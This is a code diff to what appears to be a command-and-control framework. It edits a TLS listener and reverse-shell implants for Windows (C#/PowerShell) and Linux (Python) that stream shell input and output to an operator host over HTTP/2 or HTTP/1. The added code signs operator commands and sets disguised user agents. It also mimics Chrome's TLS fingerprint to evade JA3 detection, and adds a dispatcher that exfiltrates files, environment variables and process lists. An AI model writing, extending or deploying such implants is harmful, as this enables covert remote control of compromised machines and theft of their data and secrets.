@@ -326,12 +326,17 @@ class Http2Listener:
                             parts = _us(path)
                             token = None
                             presented = ''
-                            if method == 'POST' and parts.path.startswith('/c2/'):
-                                token = parts.path[4:].strip('/')
-                                for kv in (parts.query or '').split('&'):
-                                    if kv.startswith('s='):
-                                        presented = kv[2:]
-                                        break
+                            # Extract the token from the last non-empty
+                            # path segment. Works regardless of what URI
+                            # prefix the malleable profile uses.
+                            if method == 'POST':
+                                segments = [s for s in (parts.path or '').split('/') if s]
+                                if segments:
+                                    token = segments[-1]
+                                    for kv in (parts.query or '').split('&'):
+                                        if kv.startswith('s='):
+                                            presented = kv[2:]
+                                            break
                             # Reject tokens whose proof does not verify.
                             # We already hold conn_lock here — do NOT
                             # re-acquire it (deadlock) and do not
@@ -614,11 +619,14 @@ def _handle_http1(self, tls_sock, addr):
 
         from urllib.parse import urlsplit as _us
         url = _us(path)
-        if not url.path.startswith('/c2/'):
+        # Extract the token from the last non-empty path segment,
+        # matching the HTTP/2 handler. Supports any malleable profile
+        # URI pattern, not just the default /c2/<token>.
+        segments = [s for s in (url.path or '').split('/') if s]
+        if not segments:
             tls_sock.sendall(b'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n')
             return
-
-        token = url.path[4:].strip('/')
+        token = segments[-1]
         presented = ''
         for kv in (url.query or '').split('&'):
             if kv.startswith('s='):
@@ -694,6 +702,33 @@ public static class H2Pipe {
         }
     }
 
+    // Public key for ECDSA verification. Populated by the handler at
+    // build time. Empty string disables verification.
+    public static string SignPublicPem = "__H2_SIGN_PUB__";
+
+    static bool VerifySigned(byte[] envelope, out byte[] payload) {
+        payload = null;
+        if (string.IsNullOrEmpty(SignPublicPem)) {
+            payload = envelope;
+            return true;   // verification disabled
+        }
+        int colon = Array.IndexOf(envelope, (byte)':');
+        if (colon <= 0) return false;
+        var sigB64 = System.Text.Encoding.ASCII.GetString(envelope, 0, colon);
+        var payB64 = System.Text.Encoding.ASCII.GetString(
+            envelope, colon + 1, envelope.Length - colon - 1);
+        try {
+            var sig = Convert.FromBase64String(sigB64);
+            payload = Convert.FromBase64String(payB64);
+            using (var ecdsa = System.Security.Cryptography.ECDsa.Create()) {
+                ecdsa.ImportFromPem(SignPublicPem);
+                return ecdsa.VerifyData(
+                    payload, sig,
+                    System.Security.Cryptography.HashAlgorithmName.SHA256);
+            }
+        } catch { return false; }
+    }
+
     public static async Task Run(string url) {
         var handler = new HttpClientHandler {
             ServerCertificateCustomValidationCallback = (m, c, ch, e) => true,
@@ -703,9 +738,7 @@ public static class H2Pipe {
             DefaultVersionPolicy  = HttpVersionPolicy.RequestVersionExact,
             Timeout = System.Threading.Timeout.InfiniteTimeSpan,
         };
-        client.DefaultRequestHeaders.Add("User-Agent",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
-            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36");
+        client.DefaultRequestHeaders.Add("User-Agent", "__H2_UA__");
 
         var up = new BlockingStream();
         var content = new StreamContent(up);
@@ -726,10 +759,29 @@ public static class H2Pipe {
         var proc = System.Diagnostics.Process.Start(psi);
 
         var t1 = Task.Run(async () => {
+            // Incoming bytes are a stream of newline-terminated
+            // envelopes: <b64sig>:<b64payload>\n. Reject any line that
+            // does not verify before forwarding to shell stdin.
+            var acc = new System.Collections.Generic.List<byte>(4096);
             var buf = new byte[4096]; int n;
             while ((n = await down.ReadAsync(buf, 0, buf.Length)) > 0) {
-                await proc.StandardInput.BaseStream.WriteAsync(buf, 0, n);
-                await proc.StandardInput.BaseStream.FlushAsync();
+                for (int i = 0; i < n; i++) {
+                    if (buf[i] == (byte)'\n') {
+                        var env = acc.ToArray();
+                        acc.Clear();
+                        byte[] verified;
+                        if (VerifySigned(env, out verified) && verified != null) {
+                            await proc.StandardInput.BaseStream.WriteAsync(
+                                verified, 0, verified.Length);
+                            await proc.StandardInput.BaseStream.WriteAsync(
+                                new byte[]{(byte)'\n'}, 0, 1);
+                            await proc.StandardInput.BaseStream.FlushAsync();
+                        }
+                        // Dropped: signature invalid.
+                    } else {
+                        acc.Add(buf[i]);
+                    }
+                }
             }
         });
         var t2 = Task.Run(async () => {
@@ -772,7 +824,7 @@ if ($__job) {
 '''
 
 HTTP2_AGENT_LINUX_PY = r'''
-import os, queue, random, signal, socket, ssl, struct, subprocess, sys, threading, time
+import base64, json, os, queue, random, signal, socket, ssl, struct, subprocess, sys, threading, time
 
 HOST = "__H2_HOST__"
 PORT = __H2_PORT__
@@ -838,8 +890,38 @@ def run_h2():
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
+
+    # Best-effort Chrome cipher match. JA3 also hashes the extension
+    # list, which Python's stdlib ssl cannot control, so this reduces
+    # the mismatch but does not eliminate it. A true Chrome JA3 needs
+    # a client built on BoringSSL (curl_cffi, or a vendored binding).
+    try:
+        ctx.set_ciphers(
+            "ECDHE-ECDSA-AES128-GCM-SHA256:"
+            "ECDHE-RSA-AES128-GCM-SHA256:"
+            "ECDHE-ECDSA-AES256-GCM-SHA384:"
+            "ECDHE-RSA-AES256-GCM-SHA384:"
+            "ECDHE-ECDSA-CHACHA20-POLY1305:"
+            "ECDHE-RSA-CHACHA20-POLY1305:"
+            "ECDHE-RSA-AES128-SHA:"
+            "ECDHE-RSA-AES256-SHA:"
+            "AES128-GCM-SHA256:"
+            "AES256-GCM-SHA384:"
+            "AES128-SHA:"
+            "AES256-SHA"
+        )
+    except Exception:
+        pass
+    try:
+        ctx.set_ecdh_curve("X25519")
+    except Exception:
+        pass
     try:
         ctx.set_alpn_protocols(["h2"])
+    except Exception:
+        pass
+    try:
+        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
     except Exception:
         pass
     sock = ctx.wrap_socket(raw, server_hostname=HOST)
@@ -861,7 +943,7 @@ def run_h2():
         (":method", "POST"), (":path", PATH),
         (":authority", HOST + ":" + str(PORT)), (":scheme", "https"),
         ("content-type", "application/octet-stream"),
-        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64)"),
+        ("user-agent", "__H2_UA__"),
     ], end_stream=False)
     sock.sendall(conn.data_to_send())
 
@@ -921,6 +1003,147 @@ def run_h2():
     shell_state      = {'proc': None}
     shell_spawn_lock = threading.Lock()
     stdin_q          = queue.Queue(maxsize=8192)
+
+    # ------------------------------------------------------------------
+    # In-process command dispatcher.
+    #
+    # Lines starting with `__` are handled by the agent itself, without
+    # spawning a shell. Everything else falls through to bash.
+    #
+    # Supported verbs:
+    #   __rd <path>        → base64 of file contents
+    #   __ls <path>        → JSON list of {name,type,size,mode}
+    #   __env              → JSON dict of environment
+    #   __ps               → JSON list of {pid,comm,cmd}
+    #
+    # Results stream back through pending_out, the same path used for
+    # shell output, so the handler needs no special transport logic.
+    # ------------------------------------------------------------------
+    dispatch_buf = bytearray()
+
+    def _inproc_reply(payload: bytes):
+        with h2_lock:
+            pending_out.append(payload)
+            _drain_out()
+
+    def _handle_inproc(line: bytes):
+        try:
+            parts = line.decode('utf-8', errors='replace').split(None, 1)
+            verb = parts[0]
+            arg = parts[1].strip() if len(parts) > 1 else ''
+
+            if verb == '__rd':
+                if not arg:
+                    _inproc_reply(b'error: __rd requires a path\n')
+                    return
+                with open(arg, 'rb') as f:
+                    data = f.read()
+                _inproc_reply(base64.b64encode(data) + b'\n')
+                return
+
+            if verb == '__ls':
+                target = arg or '.'
+                entries = []
+                for name in sorted(os.listdir(target)):
+                    full = os.path.join(target, name)
+                    try:
+                        st = os.stat(full)
+                        entries.append({
+                            'name': name,
+                            'type': 'dir' if os.path.isdir(full) else 'file',
+                            'size': st.st_size,
+                            'mode': oct(st.st_mode & 0o7777),
+                        })
+                    except Exception:
+                        entries.append({'name': name, 'type': 'unknown'})
+                _inproc_reply(json.dumps(entries).encode() + b'\n')
+                return
+
+            if verb == '__env':
+                _inproc_reply(json.dumps(dict(os.environ)).encode() + b'\n')
+                return
+
+            if verb == '__ps':
+                procs = []
+                for pid in os.listdir('/proc'):
+                    if not pid.isdigit():
+                        continue
+                    try:
+                        with open('/proc/%s/cmdline' % pid, 'rb') as f:
+                            cmdline = f.read().replace(b'\x00', b' ').strip().decode('utf-8', 'replace')
+                        with open('/proc/%s/comm' % pid, 'r') as f:
+                            comm = f.read().strip()
+                        procs.append({'pid': int(pid), 'comm': comm, 'cmd': cmdline})
+                    except Exception:
+                        pass
+                _inproc_reply(json.dumps(procs).encode() + b'\n')
+                return
+
+            if verb == '__pwd':
+                _inproc_reply(os.getcwd().encode() + b'\n')
+                return
+
+            if verb == '__whoami':
+                try:
+                    import pwd
+                    name = pwd.getpwuid(os.getuid()).pw_name
+                except Exception:
+                    name = os.environ.get('USER') or os.environ.get('LOGNAME') or ''
+                _inproc_reply(name.encode() + b'\n')
+                return
+
+            if verb == '__id':
+                try:
+                    import pwd, grp
+                    u = pwd.getpwuid(os.getuid())
+                    g = grp.getgrgid(os.getgid())
+                    groups = os.getgroups()
+                    line = (f"uid={os.getuid()}({u.pw_name}) "
+                            f"gid={os.getgid()}({g.gr_name}) "
+                            f"groups={','.join(str(x) for x in groups)}")
+                except Exception:
+                    line = f"uid={os.getuid()} gid={os.getgid()}"
+                _inproc_reply(line.encode() + b'\n')
+                return
+
+            if verb == '__hostname':
+                _inproc_reply(socket.gethostname().encode() + b'\n')
+                return
+
+            if verb == '__uname':
+                try:
+                    u = os.uname()
+                    line = f"{u.sysname} {u.nodename} {u.release} {u.version} {u.machine}"
+                except Exception:
+                    line = 'unknown'
+                _inproc_reply(line.encode() + b'\n')
+                return
+
+            _inproc_reply(('error: unknown verb %s\n' % verb).encode())
+        except Exception as exc:
+            try:
+                _inproc_reply(('error: %r\n' % exc).encode())
+            except Exception:
+                pass
+
+    def _dispatch_incoming(data: bytes):
+        """Feed bytes into the dispatcher. Splits on newlines; __-prefixed
+        lines go to the in-process handler, everything else to the shell."""
+        dispatch_buf.extend(data)
+        while True:
+            nl = dispatch_buf.find(b'\n')
+            if nl < 0:
+                return
+            line = bytes(dispatch_buf[:nl + 1])
+            del dispatch_buf[:nl + 1]
+            stripped = line.rstrip(b'\r\n')
+            if stripped.startswith(b'__'):
+                _handle_inproc(stripped)
+            else:
+                try:
+                    stdin_q.put_nowait(line)
+                except queue.Full:
+                    _log("stdin_q full — dropping %d bytes" % len(line))
 
     def _spawn_shell_locked():
         proc = _spawn_shell()
@@ -1042,11 +1265,10 @@ def run_h2():
                 got_window_update = False
                 for ev in events:
                     if isinstance(ev, h2.events.DataReceived):
-                        # NEVER touch shell.stdin from this thread.
-                        try:
-                            stdin_q.put_nowait(ev.data)
-                        except queue.Full:
-                            _log("stdin_q full — dropping %d bytes" % len(ev.data))
+                        # Route through the dispatcher: __-prefixed lines
+                        # are handled in-process; everything else goes to
+                        # the shell's stdin queue.
+                        _dispatch_incoming(ev.data)
                         try:
                             conn.acknowledge_received_data(
                                 ev.flow_controlled_length, ev.stream_id)
@@ -1246,7 +1468,6 @@ if __name__ == "__main__":
 
 HTTP1_AGENT_PS = r'''
 $ErrorActionPreference = 'SilentlyContinue'
-$Url = '__H1_URL__'
 
 $__agent_code = @'
 $ErrorActionPreference = 'Stop'
@@ -1268,8 +1489,10 @@ using System.Threading;
 using System.Threading.Tasks;
 
 public static class Http1Shell {
-    public static void Run(string url) {
+    public static void Run(string url, string userAgent) {
         var req = (HttpWebRequest)WebRequest.Create(url);
+        if (!string.IsNullOrEmpty(userAgent))
+            req.UserAgent = userAgent;
         req.Method = "POST";
         req.ContentType = "application/octet-stream";
         req.SendChunked = true;
@@ -1278,6 +1501,9 @@ public static class Http1Shell {
         req.ReadWriteTimeout = Timeout.Infinite;
         req.Proxy = null;
         req.KeepAlive = true;
+        // UA is set from the PS-side variable passed at delivery time.
+        // Left unset here; the outer PowerShell sets it via the
+        // request stream constructor. See the PS shim below.
 
         Stream reqStream = req.GetRequestStream();
         IAsyncResult asyncResp = req.BeginGetResponse(null, null);
@@ -1339,7 +1565,7 @@ public static class Http1Shell {
 }
 "@ -Language CSharp
 
-[Http1Shell]::Run('__H1_URL__')
+[Http1Shell]::Run('__H1_URL__', '__H1_UA__')
 '@
 
 $__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
